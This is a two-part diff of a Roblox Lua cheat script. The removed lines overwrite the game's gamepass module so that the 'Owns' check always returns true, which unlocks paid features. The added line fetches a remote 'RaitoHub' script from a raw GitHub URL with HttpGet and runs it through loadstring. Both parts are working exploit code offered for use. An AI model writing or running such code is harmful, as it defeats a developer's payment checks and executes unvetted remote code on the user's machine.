@@ -1,2 +1,1 @@
-local gmppath = require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Gamepasses"])
-gmppath.Owns = function() return true end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Wind596/RaitoHub.c-/main/RaitoHub", true))()
